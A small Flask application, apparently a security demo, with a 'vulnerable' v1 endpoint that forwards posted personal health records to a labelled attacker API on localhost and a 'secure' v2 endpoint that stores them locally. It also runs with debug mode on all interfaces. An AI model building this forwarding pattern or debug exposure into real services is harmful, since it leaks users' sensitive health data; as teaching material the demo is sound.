import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Python list to store received data
stored_data_v1 = []
stored_data_v2 = []

# Attacker's API URL
ATTACKER_API_URL = "http://localhost:5003"


# Vulnerable endpoint to receive data from API 1 and redirect it to attacker's API
@app.route('/api/v1/user/record', methods=['POST'])
def store_phr_record_vulnerable():
    data = request.json
    #stored_data_v1.append(data)

    # Redirect the received data to the attacker's API
    try:
        response = requests.post(f"{ATTACKER_API_URL}/store_data", json=data)
        if response.status_code == 200:
            return jsonify({"message": response.json()}), 200
        else:
            return jsonify({"error": "Failed to redirect data to attacker's API"}), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Failed to redirect data to attacker's API"}), 500


# Secure endpoint to receive data from API 1 and store it
@app.route('/api/v2/user/record', methods=['POST'])
def store_phr_record_secure():
    data = request.json
    stored_data_v2.append(data)
    return jsonify({"message": "Data stored securely"}), 200

# Just For Checking where data is stored
@app.route('/api/v1/check_data', methods=['GET'])
def check_data_v1():
    return jsonify({'message':'Data from External API'},stored_data_v1)

@app.route('/api/v2/check_data', methods=['GET'])
def check_data_v2():
    return jsonify({'message':'Data from External API'},stored_data_v2)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5002)
